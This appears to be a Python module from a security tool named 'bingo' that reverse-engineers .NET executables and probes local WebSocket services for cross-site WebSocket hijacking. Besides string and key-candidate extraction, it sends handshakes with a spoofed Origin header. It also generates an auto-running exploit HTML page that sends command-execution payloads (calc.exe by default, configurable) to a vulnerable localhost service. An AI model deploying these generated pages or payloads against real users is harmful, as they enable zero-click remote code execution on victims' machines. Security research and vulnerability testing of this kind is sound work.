"""
dotnet_analyzer.py — .NET Assembly Analysis + CSWSH Detection
bingo v2.3.4

Reference: https://blog.voorivex.team/first-rce-via-reverse-engineering-with-ai

Analyzes .NET EXE files (AI-guided reverse engineering):
  1. CLR header / .NET metadata stream detection
  2. US-heap string extraction (hardcoded strings)
  3. String categorization: URLs / paths / registry / crypto / error msgs
  4. Crypto material detection — 16/32-byte potential keys & IVs
  5. Localhost WebSocket server detection → CSWSH attack surface
  6. Auto-update mechanism identification
  7. Costura/embedded-DLL detection
  8. CSWSH PoC HTML generation (one-click RCE template)

CSWSH (Cross-Site WebSocket Hijacking):
  - JS scanner: find ws://127.0.0.1:PORT patterns
  - Origin-validation test (connect without correct Origin header)
  - WebSocket method enumeration
  - Auto-generate exploit HTML
"""

from __future__ import annotations

import json
import re
import socket
import struct
import sys
from dataclasses import dataclass, field
from pathlib import Path
from typing import Optional
import urllib.request
import urllib.error


# ── Data classes ──────────────────────────────────────────────────────────────

@dataclass
class DotNetString:
    offset: int
    value: str
    category: str = "unknown"   # url|path|registry|crypto|error|command|other


@dataclass
class CryptoCandidate:
    offset: int
    value: str
    length: int
    reason: str   # e.g. "16-byte adjacent pair", "looks like AES key"


@dataclass
class WebSocketEndpoint:
    url: str                    # ws://127.0.0.1:3100
    port: int
    source: str                 # "exe-string" | "js-file"
    origin_validated: Optional[bool] = None
    methods_found: list[str] = field(default_factory=list)


@dataclass
class DotNetAnalysisResult:
    file_path: str = ""
    is_dotnet: bool = False
    clr_version: str = ""
    metadata_streams: list[str] = field(default_factory=list)
    embedded_dlls: list[str] = field(default_factory=list)   # Costura etc.
    strings: list[DotNetString] = field(default_factory=list)
    crypto_candidates: list[CryptoCandidate] = field(default_factory=list)
    websocket_endpoints: list[WebSocketEndpoint] = field(default_factory=list)
    update_urls: list[str] = field(default_factory=list)
    powershell_dump_script: str = ""
    error: str = ""


@dataclass
class CswshResult:
    ws_url: str
    port: int
    reachable: bool = False
    origin_validated: bool = True   # safe by default; set False if vulnerable
    methods: list[dict] = field(default_factory=list)
    poc_html: str = ""
    severity: str = "info"   # critical / high / medium / info


# ── .NET detection (pure Python / pefile) ────────────────────────────────────

_DOTNET_METADATA_STREAMS = ("#~", "#Strings", "#US", "#GUID", "#Blob")


def _read_pe_data(path: Path) -> bytes:
    try:
        return path.read_bytes()
    except OSError:
        return b""


def detect_dotnet(file_path: str) -> dict:
    """
    Detect whether a PE file is a .NET assembly.

    Returns:
        {
            "is_dotnet": bool,
            "clr_version": str,
            "metadata_streams": [str],
            "embedded_dlls": [str],   # Costura resources
        }
    """
    result: dict = {
        "is_dotnet": False,
        "clr_version": "",
        "metadata_streams": [],
        "embedded_dlls": [],
    }

    data = _read_pe_data(Path(file_path))
    if not data:
        return result

    # CLR header magic check (IMAGE_COR20_HEADER signature in data directory #14)
    # Quick heuristic: look for .NET metadata signature 0x424A5342 ("BSJB")
    if b"BSJB" in data:
        result["is_dotnet"] = True

        # Extract version string following BSJB signature
        idx = data.find(b"BSJB")
        if idx != -1 and idx + 20 < len(data):
            # version length at offset +12
            ver_len_off = idx + 12
            if ver_len_off + 4 < len(data):
                ver_len = struct.unpack_from("<I", data, ver_len_off)[0]
                ver_bytes = data[ver_len_off + 4 : ver_len_off + 4 + min(ver_len, 32)]
                try:
                    result["clr_version"] = ver_bytes.rstrip(b"\x00").decode("ascii", errors="replace")
                except Exception:
                    pass

        # Find metadata streams
        for stream in _DOTNET_METADATA_STREAMS:
            if stream.encode() in data:
                result["metadata_streams"].append(stream)

    # Costura embedded DLL detection (resource names like "costura.xxx.dll.compressed")
    costura_pattern = re.compile(rb"costura\.([a-zA-Z0-9._-]+)\.dll", re.IGNORECASE)
    for m in costura_pattern.finditer(data):
        name = m.group(1).decode("ascii", errors="replace")
        if name not in result["embedded_dlls"]:
            result["embedded_dlls"].append(name)

    # Also check for ILMerge/Fody markers
    if b"Fody" in data or b"ILMerge" in data:
        result["embedded_dlls"].append("[ILMerge/Fody packer detected]")

    return result


# ── US-heap string extraction ─────────────────────────────────────────────────

def extract_dotnet_strings(file_path: str, min_len: int = 4) -> list[DotNetString]:
    """
    Extract strings from a .NET assembly's #US (user-string) heap.

    Uses a pure-Python approach (no PowerShell required):
    - Finds the #US stream offset
    - Reads length-prefixed Unicode strings
    Also extracts ASCII strings from the binary as fallback.
    """
    data = _read_pe_data(Path(file_path))
    if not data:
        return []

    results: list[DotNetString] = []
    seen: set[str] = set()

    # ── Method 1: #US heap (length-prefixed UTF-16LE blobs) ──────────
    us_marker = b"#US\x00"
    idx = data.find(us_marker)
    if idx != -1:
        # Stream offset/size in stream header table
        # Simple approach: scan after BSJB for #US content
        bsjb = data.find(b"BSJB")
        if bsjb != -1:
            # Scan the region after BSJB for UTF-16LE strings
            region = data[bsjb : bsjb + 0x100000]
            i = 0
            while i < len(region) - 4:
                # Length-prefixed: compressed uint + UTF-16LE bytes
                b0 = region[i]
                if b0 < 0x80:
                    slen = b0
                else:
                    slen = ((b0 & 0x3F) << 8 | region[i + 1]) if i + 1 < len(region) else 0

                byte_len = (slen - 1) if slen > 0 else 0   # last byte is terminal
                if 2 <= byte_len <= 512 and i + 1 + byte_len <= len(region):
                    raw = region[i + 1 : i + 1 + byte_len]
                    try:
                        s = raw.decode("utf-16-le", errors="strict")
                        s = s.rstrip("\x00")
                        if len(s) >= min_len and s not in seen and _is_useful_string(s):
                            seen.add(s)
                            results.append(DotNetString(
                                offset=bsjb + i,
                                value=s,
                                category=_categorize_string(s),
                            ))
                    except (UnicodeDecodeError, ValueError):
                        pass
                i += max(1, slen + 1)

    # ── Method 2: ASCII printable strings (fallback / supplement) ────
    ascii_pattern = re.compile(rb"[\x20-\x7e]{%d,200}" % max(min_len, 6))
    for m in ascii_pattern.finditer(data):
        try:
            s = m.group().decode("ascii")
            if s not in seen and _is_useful_string(s):
                seen.add(s)
                results.append(DotNetString(
                    offset=m.start(),
                    value=s,
                    category=_categorize_string(s),
                ))
        except UnicodeDecodeError:
            pass

    return results


def _is_useful_string(s: str) -> bool:
    """Filter out noise (all-whitespace, pure hex dump lines, etc.)."""
    s = s.strip()
    if not s or len(s) < 3:
        return False
    # Skip strings that are mostly non-printable escapes after decode
    printable = sum(1 for c in s if c.isprintable())
    return printable / len(s) > 0.8


def _categorize_string(s: str) -> str:
    """Categorize a string by its content."""
    sl = s.lower()
    if re.match(r"https?://|wss?://|ftp://", sl):
        return "url"
    if re.match(r"ws://127\.|ws://localhost", sl):
        return "websocket-local"
    if re.match(r"SOFTWARE\\|HKEY_|HKLM\\|HKCU\\", s, re.IGNORECASE):
        return "registry"
    if re.search(r"\\[a-zA-Z0-9_\-]+\.(exe|dll|bat|ps1|ini|cfg|log)", sl):
        return "path"
    if re.search(r"c:\\|%appdata%|%temp%|%programfiles%", sl):
        return "path"
    if re.search(r"error|exception|fail|warn|cannot|invalid|timeout", sl):
        return "error"
    if re.search(r"update|version|download|upgrade|patch|setup|install", sl):
        return "update"
    if re.search(r"password|passwd|secret|token|key|auth|credential", sl):
        return "credential"
    if re.search(r"(execute|run|cmd|command|shell|process|start)", sl):
        return "command"
    # Crypto heuristic: 16 or 32 printable chars that look like keys
    if _looks_like_crypto_material(s):
        return "crypto"
    return "other"


def _looks_like_crypto_material(s: str) -> bool:
    """
    Heuristic from the blog post: 16 or 32 bytes, not natural language.
    Also catches hex strings that could be keys.
    """
    s = s.strip()
    # Exactly 16 or 32 chars (AES-128 or AES-256 key)
    if len(s) in (16, 32):
        # Not a common word / sentence
        if " " not in s and not s.isdigit():
            # Has mixed chars (not all lower/upper)
            has_digit = any(c.isdigit() for c in s)
            has_alpha = any(c.isalpha() for c in s)
            if has_digit and has_alpha:
                return True
    # 32 or 64-char hex string
    if len(s) in (32, 64) and re.fullmatch(r"[0-9a-fA-F]+", s):
        return True
    return False


# ── Crypto material detection ─────────────────────────────────────────────────

def detect_crypto_material(strings: list[DotNetString]) -> list[CryptoCandidate]:
    """
    Identify potential AES keys, IVs, and other crypto material.
    Blog post insight: 16-byte strings at adjacent heap offsets are suspicious.
    """
    candidates: list[CryptoCandidate] = []

    crypto_strings = [s for s in strings if s.category == "crypto" or _looks_like_crypto_material(s.value)]

    # Sort by offset to find adjacent pairs
    crypto_strings.sort(key=lambda x: x.offset)

    for i, s in enumerate(crypto_strings):
        reason_parts = []
        v = s.value.strip()

        if len(v) == 16:
            reason_parts.append("16-byte → possible AES-128 key or IV")
        if len(v) == 32:
            if re.fullmatch(r"[0-9a-fA-F]+", v):
                reason_parts.append("32-char hex → possible MD5 hash or AES-128 key (hex)")
            else:
                reason_parts.append("32-byte → possible AES-256 key")

        # Check adjacency with next string (blog post pattern)
        if i + 1 < len(crypto_strings):
            nxt = crypto_strings[i + 1]
            gap = nxt.offset - s.offset
            if gap < 100:
                reason_parts.append(f"adjacent pair at +{gap} bytes → key+IV pattern")

        if reason_parts:
            candidates.append(CryptoCandidate(
                offset=s.offset,
                value=v,
                length=len(v),
                reason=" | ".join(reason_parts),
            ))

    return candidates


# ── WebSocket endpoint detection ──────────────────────────────────────────────

_WS_LOCALHOST_RE = re.compile(
    r"""ws[s]?://(?:127\.0\.0\.1|localhost|0\.0\.0\.0):(\d+)""",
    re.IGNORECASE,
)


def find_websocket_endpoints(strings: list[DotNetString], source: str = "exe-string") -> list[WebSocketEndpoint]:
    """Find localhost WebSocket endpoints in extracted strings."""
    endpoints: list[WebSocketEndpoint] = []
    seen_ports: set[int] = set()

    for s in strings:
        m = _WS_LOCALHOST_RE.search(s.value)
        if m:
            port = int(m.group(1))
            if port not in seen_ports:
                seen_ports.add(port)
                endpoints.append(WebSocketEndpoint(
                    url=m.group(0),
                    port=port,
                    source=source,
                ))

    return endpoints


def scan_js_for_websockets(js_content: str, source: str = "js-file") -> list[WebSocketEndpoint]:
    """
    Scan JavaScript content for WebSocket usage.
    Matches: new WebSocket('ws://127.0.0.1:PORT') patterns.
    """
    endpoints: list[WebSocketEndpoint] = []
    seen_ports: set[int] = set()

    # Match WebSocket constructor calls
    ws_re = re.compile(
        r"""new\s+WebSocket\s*\(\s*['"](ws[s]?://[^'"]+)['"]\s*\)""",
        re.IGNORECASE,
    )
    for m in ws_re.finditer(js_content):
        url = m.group(1)
        port_m = re.search(r":(\d+)", url)
        if port_m:
            port = int(port_m.group(1))
            if port not in seen_ports:
                seen_ports.add(port)
                endpoints.append(WebSocketEndpoint(url=url, port=port, source=source))

    # Also match bare ws:// strings
    for m in _WS_LOCALHOST_RE.finditer(js_content):
        port = int(m.group(1))
        if port not in seen_ports:
            seen_ports.add(port)
            endpoints.append(WebSocketEndpoint(url=m.group(0), port=port, source=source))

    return endpoints


# ── CSWSH testing ─────────────────────────────────────────────────────────────

def test_ws_port_open(host: str, port: int, timeout: float = 2.0) -> bool:
    """Quick TCP probe to check if WebSocket port is open."""
    try:
        with socket.create_connection((host, port), timeout=timeout):
            return True
    except OSError:
        return False


def test_cswsh(ws_url: str, timeout: float = 5.0) -> CswshResult:
    """
    Test for Cross-Site WebSocket Hijacking (CSWSH).

    Steps:
      1. Check if port is open
      2. Attempt WebSocket connection WITHOUT Origin header (simulates attacker page)
      3. Attempt WebSocket connection WITH wrong Origin header
      4. Detect if server rejects based on Origin

    Returns CswshResult with vulnerability assessment.
    """
    port_m = re.search(r":(\d+)", ws_url)
    port = int(port_m.group(1)) if port_m else 80
    host_m = re.search(r"ws[s]?://([^/:]+)", ws_url)
    host = host_m.group(1) if host_m else "127.0.0.1"

    result = CswshResult(ws_url=ws_url, port=port)
    result.reachable = test_ws_port_open(host, port, timeout=timeout)

    if not result.reachable:
        result.severity = "info"
        return result

    # Try HTTP upgrade handshake manually (raw TCP) to test origin validation
    try:
        import base64, hashlib, os as _os

        ws_key = base64.b64encode(_os.urandom(16)).decode()
        path = "/"

        # Request WITHOUT Origin header (attacker page simulation)
        req_no_origin = (
            f"GET {path} HTTP/1.1\r\n"
            f"Host: {host}:{port}\r\n"
            f"Upgrade: websocket\r\n"
            f"Connection: Upgrade\r\n"
            f"Sec-WebSocket-Key: {ws_key}\r\n"
            f"Sec-WebSocket-Version: 13\r\n"
            f"\r\n"
        )

        with socket.create_connection((host, port), timeout=timeout) as s:
            s.sendall(req_no_origin.encode())
            resp_no_origin = s.recv(2048).decode(errors="replace")

        # Request WITH wrong Origin header
        ws_key2 = base64.b64encode(_os.urandom(16)).decode()
        req_wrong_origin = (
            f"GET {path} HTTP/1.1\r\n"
            f"Host: {host}:{port}\r\n"
            f"Upgrade: websocket\r\n"
            f"Connection: Upgrade\r\n"
            f"Sec-WebSocket-Key: {ws_key2}\r\n"
            f"Sec-WebSocket-Version: 13\r\n"
            f"Origin: https://evil.attacker.com\r\n"
            f"\r\n"
        )

        with socket.create_connection((host, port), timeout=timeout) as s:
            s.sendall(req_wrong_origin.encode())
            resp_wrong_origin = s.recv(2048).decode(errors="replace")

        # If both return 101 Switching Protocols → VULNERABLE (no origin check)
        no_origin_ok  = "101" in resp_no_origin
        wrong_origin_ok = "101" in resp_wrong_origin

        if no_origin_ok and wrong_origin_ok:
            result.origin_validated = False
            result.severity = "critical"
        elif no_origin_ok and not wrong_origin_ok:
            result.origin_validated = False   # partial
            result.severity = "high"
        else:
            result.origin_validated = True
            result.severity = "info"

    except Exception as exc:
        result.severity = "info"

    # Generate PoC if vulnerable
    if not result.origin_validated:
        result.poc_html = generate_cswsh_poc(ws_url)

    return result


# ── CSWSH PoC generator ───────────────────────────────────────────────────────

def generate_cswsh_poc(
    ws_url: str,
    methods: Optional[list[dict]] = None,
    rce_payload: str = "calc.exe",
) -> str:
    """
    Generate a ready-to-use CSWSH PoC HTML page.

    Based on the blog post attack pattern:
      {RUN: 'DRIVE', URL: 'calc.exe'}
    Generates a page that auto-connects and sends commands.
    """
    # Default methods from the blog post pattern
    default_methods = methods or [
        {"action": "VERSION_CHECK", "payload": {"GET": "VERSION"}},
        {"action": "RCE_via_DRIVE",  "payload": {"RUN": "DRIVE", "URL": rce_payload}},
        {"action": "RCE_via_APP",    "payload": {"RUN": "APP",   "URL": rce_payload}},
        {"action": "EXECUTE_CMD",    "payload": {"action": "EXECUTE", "data": rce_payload}},
    ]

    methods_js = json.dumps(default_methods, indent=4)

    poc = f"""<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>CSWSH PoC — bingo v2.3.4</title>
    <style>
        body {{ font-family: monospace; background: #1a1a1a; color: #00ff41; padding: 20px; }}
        h2 {{ color: #ff4444; }}
        #log {{ background: #0d0d0d; border: 1px solid #333; padding: 12px; margin-top: 10px;
               min-height: 200px; max-height: 400px; overflow-y: auto; }}
        .ok  {{ color: #00ff41; }}
        .err {{ color: #ff4444; }}
        .msg {{ color: #00d4ff; }}
    </style>
</head>
<body>
    <h2>⚡ CSWSH PoC — {ws_url}</h2>
    <p>Target WebSocket: <code>{ws_url}</code><br>
       RCE Payload: <code>{rce_payload}</code></p>
    <div id="log"></div>

    <script>
    // bingo v2.3.4 — Auto-generated CSWSH PoC
    // Ref: https://blog.voorivex.team/first-rce-via-reverse-engineering-with-ai
    const WS_URL  = "{ws_url}";
    const METHODS = {methods_js};

    const log = document.getElementById("log");
    function print(msg, cls="msg") {{
        log.innerHTML += `<div class="${{cls}}">${{new Date().toISOString()}} ${{msg}}</div>`;
        log.scrollTop = log.scrollHeight;
    }}

    let methodIdx = 0;

    function tryMethod(ws) {{
        if (methodIdx >= METHODS.length) {{
            print("[+] All methods tried.", "ok");
            ws.close();
            return;
        }}
        const m = METHODS[methodIdx++];
        const payload = JSON.stringify(m.payload);
        print(`[>] Trying ${{m.action}}: ${{payload}}`);
        ws.send(payload);
    }}

    function connect() {{
        print(`[*] Connecting to ${{WS_URL}} ...`);
        const ws = new WebSocket(WS_URL);

        ws.onopen = function() {{
            print("[+] Connected! (no Origin validation → CSWSH confirmed)", "ok");
            tryMethod(ws);
        }};

        ws.onmessage = function(e) {{
            print(`[<] Response: ${{e.data}}`, "ok");
            // Try next method after receiving response
            setTimeout(() => tryMethod(ws), 500);
        }};

        ws.onerror = function() {{
            print("[x] WebSocket error — service may not be running", "err");
        }};

        ws.onclose = function() {{
            print("[*] Connection closed.");
        }};
    }}

    // Auto-run on page load (zero interaction required)
    window.addEventListener("load", connect);
    </script>
</body>
</html>
"""
    return poc


# ── Update mechanism detection ────────────────────────────────────────────────

_UPDATE_PATTERNS = [
    re.compile(r"https?://[^\s\"'<>]+(?:update|upgrade|patch|setup|install|download)[^\s\"'<>]*", re.IGNORECASE),
    re.compile(r"VERSION\s*=\s*[\d.]+"),
    re.compile(r"FILENAME\s*=\s*[^\r\n]+"),
    re.compile(r"PATH\s*=\s*[^\r\n]+"),
    re.compile(r"HASH\s*=\s*[0-9a-fA-F]{32,64}"),
]

def detect_update_mechanism(strings: list[DotNetString]) -> list[str]:
    """Find auto-update patterns (URL, version, hash patterns from .ini.enc style configs)."""
    hits: list[str] = []
    for s in strings:
        for pat in _UPDATE_PATTERNS:
            if pat.search(s.value):
                hits.append(s.value)
                break
    return list(dict.fromkeys(hits))   # deduplicate, preserve order


# ── PowerShell dump script generator ─────────────────────────────────────────

def generate_powershell_dump(exe_path: str) -> str:
    """
    Generate a PowerShell script to dump .NET US-heap strings
    using System.Reflection (as described in the blog post).
    Works on Windows without any external tools.
    """
    return f"""# bingo v2.3.4 — .NET String Dump via PowerShell Reflection
# Based on: https://blog.voorivex.team/first-rce-via-reverse-engineering-with-ai
# Usage: .\\dump_strings.ps1 > strings.txt

$exePath = "{exe_path}"
$asm = [System.Reflection.Assembly]::LoadFile($exePath)
$module = $asm.GetModules()[0]
$offset = 0

while ($offset -lt 0x4000) {{
    try {{
        $token = 0x70000000 -bor $offset
        $str = $module.ResolveString($token)
        if ($str -and $str.Length -gt 2) {{
            Write-Output ("US[0x" + $offset.ToString("x") + "]: " + $str)
        }}
    }} catch {{}}
    $offset += 2
}}
"""


# ── Full analysis pipeline ────────────────────────────────────────────────────

def analyze_dotnet(file_path: str) -> DotNetAnalysisResult:
    """
    Full .NET assembly analysis pipeline:
      1. Detect if .NET
      2. Extract strings
      3. Detect crypto material
      4. Find WebSocket endpoints
      5. Find update mechanisms
      6. Generate PowerShell dump script
    """
    result = DotNetAnalysisResult(file_path=file_path)
    path = Path(file_path)

    if not path.exists():
        result.error = f"File not found: {file_path}"
        return result

    # Step 1: detect .NET
    dotnet_info = detect_dotnet(file_path)
    result.is_dotnet = dotnet_info["is_dotnet"]
    result.clr_version = dotnet_info["clr_version"]
    result.metadata_streams = dotnet_info["metadata_streams"]
    result.embedded_dlls = dotnet_info["embedded_dlls"]

    # Step 2: extract strings
    result.strings = extract_dotnet_strings(file_path)

    # Step 3: crypto material
    result.crypto_candidates = detect_crypto_material(result.strings)

    # Step 4: WebSocket endpoints
    result.websocket_endpoints = find_websocket_endpoints(result.strings)

    # Step 5: update mechanisms
    result.update_urls = detect_update_mechanism(result.strings)

    # Step 6: PowerShell dump script
    result.powershell_dump_script = generate_powershell_dump(file_path)

    return result


def format_report(result: DotNetAnalysisResult) -> str:
    """Format analysis result as a human-readable report."""
    lines = [
        "",
        "═" * 60,
        f"  bingo v2.3.4 — .NET Analysis Report",
        f"  File: {result.file_path}",
        "═" * 60,
        "",
    ]

    if result.error:
        lines.append(f"  ERROR: {result.error}")
        return "\n".join(lines)

    lines.append(f"  .NET Assembly: {'✅ YES' if result.is_dotnet else '❌ No'}")
    if result.clr_version:
        lines.append(f"  CLR Version:   {result.clr_version}")
    if result.metadata_streams:
        lines.append(f"  Streams:       {', '.join(result.metadata_streams)}")
    if result.embedded_dlls:
        lines.append(f"  Embedded DLLs: {', '.join(result.embedded_dlls)}")

    lines += ["", "─" * 60, "  STRINGS BY CATEGORY", "─" * 60]
    categories: dict[str, list[str]] = {}
    for s in result.strings:
        categories.setdefault(s.category, []).append(s.value)
    for cat, vals in sorted(categories.items()):
        lines.append(f"\n  [{cat.upper()}] ({len(vals)} items)")
        for v in vals[:10]:
            lines.append(f"    {v}")
        if len(vals) > 10:
            lines.append(f"    ... +{len(vals)-10} more")

    if result.crypto_candidates:
        lines += ["", "─" * 60, "  🔑 CRYPTO MATERIAL CANDIDATES", "─" * 60]
        for c in result.crypto_candidates:
            lines.append(f"  [0x{c.offset:06x}] {c.value!r:<36} ← {c.reason}")

    if result.websocket_endpoints:
        lines += ["", "─" * 60, "  🔌 LOCALHOST WEBSOCKET ENDPOINTS (CSWSH Risk)", "─" * 60]
        for ep in result.websocket_endpoints:
            lines.append(f"  {ep.url}  (port {ep.port}, source: {ep.source})")
            lines.append(f"    → Test CSWSH: bingo> cswsh test {ep.url}")

    if result.update_urls:
        lines += ["", "─" * 60, "  🔄 UPDATE MECHANISM", "─" * 60]
        for u in result.update_urls[:10]:
            lines.append(f"  {u}")

    lines += ["", "─" * 60, "  📜 POWERSHELL DUMP SCRIPT", "─" * 60]
    lines.append("  (Save as dump_strings.ps1 and run on Windows)")
    lines.append("")
    lines.append(result.powershell_dump_script)

    lines += ["", "═" * 60, ""]
    return "\n".join(lines)


def cswsh_full_test(ws_url: str, save_poc: Optional[str] = None) -> str:
    """
    Full CSWSH test + report + optional PoC save.

    Args:
        ws_url:   WebSocket URL (e.g. ws://127.0.0.1:3100)
        save_poc: Path to save PoC HTML (None = print only)
    """
    result = test_cswsh(ws_url)
    lines = [
        "",
        "═" * 60,
        f"  bingo v2.3.4 — CSWSH Test",
        f"  Target: {ws_url}",
        "═" * 60,
        f"  Port Open:        {'✅ YES' if result.reachable else '❌ NO'}",
        f"  Origin Validated: {'✅ YES (not vulnerable)' if result.origin_validated else '❌ NO  ← VULNERABLE'}",
        f"  Severity:         {result.severity.upper()}",
    ]

    if not result.origin_validated:
        lines += [
            "",
            "  ⚠  CSWSH CONFIRMED — Any website can connect to this WebSocket!",
            "  Attack scenario:",
            "    1. Victim has the application installed (service on ws://127.0.0.1:PORT)",
            "    2. Victim visits attacker-controlled webpage",
            "    3. JS auto-connects with no auth/origin check",
            "    4. Attacker sends commands → potential RCE",
            "",
            f"  PoC generated: {len(result.poc_html)} bytes",
        ]
        if save_poc:
            Path(save_poc).write_text(result.poc_html, encoding="utf-8")
            lines.append(f"  PoC saved to:  {save_poc}")
        else:
            lines.append("  Use: cswsh_full_test(ws_url, save_poc='poc.html') to save")

    lines += ["", "═" * 60, ""]
    return "\n".join(lines)


if __name__ == "__main__":
    if len(sys.argv) > 1:
        path = sys.argv[1]
        if path.startswith("ws://") or path.startswith("wss://"):
            print(cswsh_full_test(path, save_poc="cswsh_poc.html"))
        else:
            r = analyze_dotnet(path)
            print(format_report(r))
    else:
        print("Usage:")
        print("  python -m bingo.tools.dotnet_analyzer <file.exe>")
        print("  python -m bingo.tools.dotnet_analyzer ws://127.0.0.1:3100")
